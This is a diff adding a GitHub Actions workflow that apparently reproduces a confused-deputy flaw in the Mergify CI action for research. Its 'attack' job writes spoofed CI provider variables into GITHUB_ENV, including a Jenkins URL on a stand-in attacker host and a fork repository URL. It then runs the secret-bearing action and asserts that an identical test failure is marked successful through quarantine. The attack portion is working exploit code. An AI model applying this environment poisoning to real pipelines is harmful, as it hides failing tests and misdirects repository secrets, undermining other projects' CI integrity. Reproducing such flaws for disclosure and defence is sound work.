@@ -1,0 +1,92 @@
+name: VM2 provider spoof quarantine confused-deputy
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  control:
+    name: Control - GitHub provider stays on source repo
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create identical failing JUnit
+        shell: bash
+        run: |
+          cat > report.xml <<'XML'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <testsuite name="vm2.provider.spoof" tests="1" failures="1">
+            <testcase classname="vm2.provider_spoof.secret_deputy" name="20260914">
+              <failure message="controlled failure">controlled failure</failure>
+            </testcase>
+          </testsuite>
+          XML
+
+      - name: Mergify control
+        id: mergify
+        continue-on-error: true
+        uses: Mergifyio/gha-mergify-ci@v25
+        with:
+          action: junit-process
+          token: ${{ secrets.VM2_PROVIDER_SPOOF_MERGIFY_TOKEN }}
+          report_path: report.xml
+          mergify_cli_version: 2026.9.10.1
+
+      - name: Assert source-repo control is red
+        if: always()
+        env:
+          MERGIFY_OUTCOME: ${{ steps.mergify.outcome }}
+        shell: bash
+        run: |
+          echo "VM2_PROVIDER_SPOOF_CONTROL_OUTCOME=${MERGIFY_OUTCOME}"
+          test "${MERGIFY_OUTCOME}" = failure
+
+  attack:
+    name: Attack - prior step redirects secret-bearing Mergify action
+    runs-on: ubuntu-latest
+    steps:
+      - name: Simulated earlier untrusted code poisons provider detection
+        shell: bash
+        run: |
+          {
+            echo 'JENKINS_URL=https://jenkins.attacker.invalid/'
+            echo 'GIT_URL=https://github.com/livastic-vm2-lab-20260911-g3a9/mrg-vm2-qslug-fork-0912-k7p4.git'
+            echo 'GIT_BRANCH=main'
+            echo "GIT_COMMIT=${GITHUB_SHA}"
+            echo 'JOB_NAME=vm2-provider-spoof'
+            echo "BUILD_ID=${GITHUB_RUN_ID}"
+            echo "BUILD_URL=https://github.com/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}"
+            echo 'NODE_NAME=vm2-provider-spoof'
+          } >> "${GITHUB_ENV}"
+
+      - name: Create identical failing JUnit
+        shell: bash
+        run: |
+          cat > report.xml <<'XML'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <testsuite name="vm2.provider.spoof" tests="1" failures="1">
+            <testcase classname="vm2.provider_spoof.secret_deputy" name="20260914">
+              <failure message="controlled failure">controlled failure</failure>
+            </testcase>
+          </testsuite>
+          XML
+
+      - name: Mergify attack
+        id: mergify
+        continue-on-error: true
+        uses: Mergifyio/gha-mergify-ci@v25
+        with:
+          action: junit-process
+          token: ${{ secrets.VM2_PROVIDER_SPOOF_MERGIFY_TOKEN }}
+          report_path: report.xml
+          mergify_cli_version: 2026.9.10.1
+
+      - name: Assert spoofed sibling quarantine turns identical failure green
+        if: always()
+        env:
+          MERGIFY_OUTCOME: ${{ steps.mergify.outcome }}
+        shell: bash
+        run: |
+          echo "VM2_PROVIDER_SPOOF_ATTACK_OUTCOME=${MERGIFY_OUTCOME}"
+          test "${MERGIFY_OUTCOME}" = success
